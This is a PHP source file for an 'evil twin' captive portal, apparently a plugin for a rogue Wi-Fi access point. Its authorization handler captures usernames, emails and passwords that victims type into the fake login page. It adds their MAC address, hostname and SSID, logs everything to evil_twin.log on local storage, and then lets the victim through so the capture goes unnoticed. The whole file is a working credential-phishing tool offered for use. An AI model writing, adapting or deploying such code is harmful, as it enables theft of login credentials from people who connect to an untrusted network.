<?php

namespace evilportal;

class MyPortal extends Portal {

    // this is where your form data gets submitted to
    public function handleAuthorization() {

        $limit = 100;
        // basic flood protection
        // each form input should have no more than $limit characters

        $parameters = array();

        if (isset($this->request->username)) {
            $this->request->username = trim($this->request->username);
            if (strlen($this->request->username) >= 1 && strlen($this->request->username) <= $limit) {
                $parameters['username'] = strtolower($this->request->username);
            }
        }
        if (isset($this->request->email)) {
            $this->request->email = trim($this->request->email);
            if (strlen($this->request->email) >= 1 && strlen($this->request->email) <= $limit) {
                $parameters['email'] = strtolower($this->request->email);
            }
        }
        if (isset($this->request->password)) {
            if (strlen($this->request->password) >= 1 && strlen($this->request->password) <= $limit) {
                $parameters['password'] = $this->request->password;
            }
        }
        if ((isset($parameters['username']) || isset($parameters['email'])) && isset($parameters['password'])) {

            if (isset($this->request->mac)) {
                $parameters['mac'] = strtolower(substr(trim($this->request->mac), 0, $limit));
            }
            if (isset($this->request->host)) {
                $parameters['host'] = strtolower(substr(trim($this->request->host), 0, $limit));
            }
            if (isset($this->request->ssid)) {
                $parameters['ssid'] = strtolower(substr(trim($this->request->ssid), 0, $limit));
            }

            $parameters['datetime'] = date('Y-m-d H:i:s', time());

            // write JSON string to a file
            $string = json_encode($parameters) . "\n";

            if (file_exists('/sd/portals/evil-twin/')) {
                // write to an SD card storage as the first option
                if (!file_exists('/sd/logs/')) {
                    mkdir('/sd/logs/');
                }
                file_put_contents('/sd/logs/evil_twin.log', $string, FILE_APPEND | LOCK_EX);
            } else if (file_exists('/root/portals/evil-twin/')) {
                // write to an internal storage as the second option
                if (!file_exists('/root/logs/')) {
                    mkdir('/root/logs/');
                }
                file_put_contents('/root/logs/evil_twin.log', $string, FILE_APPEND | LOCK_EX);
            }
        }

        // call the parent to handle basic authorization first
        // this is where and when the user redirection is taking place
        parent::handleAuthorization();
    }

    /**
     * Override this to do something when the client is successfully authorized.
     * By default it just notifies the Web UI.
     */
    public function onSuccess() {

        // calls default success message
        parent::onSuccess();
    }

    /**
     * If an error occurs then do something here.
     * Override to provide your own functionality.
     */
    public function showError() {

        // calls default error message
        parent::showError();
    }
}
?>
